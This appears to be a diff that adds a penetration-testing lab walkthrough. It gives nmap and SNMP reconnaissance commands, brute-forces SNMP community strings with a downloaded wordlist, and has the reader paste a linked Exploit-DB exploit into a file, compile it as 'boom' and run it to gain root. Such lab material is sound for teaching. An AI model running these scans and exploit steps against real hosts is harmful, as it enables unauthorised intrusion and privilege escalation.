@@ -1,0 +1,35 @@
+---------------------------Type This-----------------------------------
+sudo nmap -sV 172.31.2.181
+
+sudo nmap -sU -p69,161 172.31.2.181
+
+sudo apt-get -y install onesixtyone snmp
+
+wget https://raw.githubusercontent.com/fuzzdb-project/fuzzdb/master/wordlists-misc/wordlist-common-snmp-community-strings.txt
+
+onesixtyone -c wordlist-common-snmp-community-strings.txt 172.31.2.181
+
+snmpwalk -Os -c public -v 1 172.31.2.181
+
+---------------------------Type This-----------------------------------
+cat >> exploit.c << out
+ 
+**************paste in the content from here *****************
+https://www.exploit-db.com/raw/39166/
+ 
+ 
+------ hit enter a few times ------
+ 
+------ then type 'out' ----- this closes the file handle...
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+gcc -o boom exploit.c
+ 
+./boom
+ 
+id
+ 
+ 
+......YEAH - do the happy dance!!!!
